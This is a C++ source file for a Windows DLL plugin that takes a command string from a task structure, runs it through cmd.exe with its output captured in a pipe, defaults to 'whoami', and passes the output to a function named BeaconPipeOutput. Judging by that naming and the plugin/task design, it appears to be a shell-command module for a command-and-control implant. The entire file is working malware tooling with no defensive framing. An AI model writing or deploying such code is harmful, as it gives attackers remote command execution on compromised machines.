#include <Windows.h>
#include <new>
#include "../../Include/IPlugin.h"

static DWORD RunCommand(const char* cmd, DWORD cmdLen) {
    static const char kDefault[] = "whoami";
    if (!cmd || cmdLen == 0) {
        cmd    = kDefault;
        cmdLen = (DWORD)sizeof(kDefault) - 1;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return GetLastError();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    static const char kPrefix[] = "C:\\Windows\\System32\\cmd.exe /c ";
    const DWORD prefixLen = (DWORD)sizeof(kPrefix) - 1;
    const DWORD totalLen  = prefixLen + cmdLen;

    char* full = (char*)HeapAlloc(GetProcessHeap(), 0, totalLen + 1);
    if (!full) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return ERROR_OUTOFMEMORY;
    }
    CopyMemory(full, kPrefix, prefixLen);
    CopyMemory(full + prefixLen, cmd, cmdLen);
    full[totalLen] = '\0';

    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessA(nullptr, full, nullptr, nullptr,
                             TRUE, 0, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);

    if (!ok) {
        DWORD le = GetLastError();
        HeapFree(GetProcessHeap(), 0, full);
        CloseHandle(hRead);
        return le;
    }

    BeaconPipeOutput(hRead);

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    HeapFree(GetProcessHeap(), 0, full);
    return code;
}

class CmdPlugin : public IPlugin {
public:
    void init()    const override {}
    void cleanup() const override {}
    void execute(TaskApi* task) const override {
        RunCommand(task->Command, task->CommandLen);
    }
};

static IPlugin* g_plugin = nullptr;

extern "C" IPlugin* __stdcall create_plugin() {
    if (g_plugin) return g_plugin;
    void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CmdPlugin));
    if (!mem) return nullptr;
    g_plugin = ::new (mem) CmdPlugin();
    return g_plugin;
}

extern "C" void __stdcall destroy_plugin(IPlugin* p) {
    if (!p) return;
    p->~IPlugin();
    HeapFree(GetProcessHeap(), 0, p);
    if (p == g_plugin) g_plugin = nullptr;
}

extern "C" void __stdcall plugin_init(IPlugin* p) {
    if (!p) p = create_plugin();
    if (p) p->init();
}

extern "C" void __stdcall plugin_exec(TaskApi* task) {
    if (!g_plugin) g_plugin = create_plugin();
    if (g_plugin) g_plugin->execute(task);
}

extern "C" void __stdcall plugin_cleanup(IPlugin* p) {
    if (!p) p = g_plugin;
    if (p) p->cleanup();
}
